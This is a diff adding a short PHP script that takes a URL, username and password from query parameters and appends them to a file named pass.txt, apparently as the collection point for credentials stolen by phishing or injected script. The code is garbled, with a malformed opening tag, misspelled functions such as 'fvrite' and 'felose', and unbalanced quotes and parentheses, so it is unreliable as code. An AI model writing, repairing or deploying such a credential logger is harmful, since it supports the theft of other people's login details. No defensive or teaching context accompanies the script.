@@ -1,0 +1,11 @@
+</php
+
+    $_FILES = fopen("pass.txt", "a") or die("can't open file");
+    if(isset($_GET["url"]) && isset($_GET["username"] && isset($_GET["pass"])) {
+        $String = "URL" ".$_GET["url"]." | USERNAME: ".$_GET[username]." | PASS: ".$_GET["pass"]." "r\n\";
+        fvrite($_FILES, $String);
+        felose($_FILES);
+        echo "ok"
+    }
+
+?>
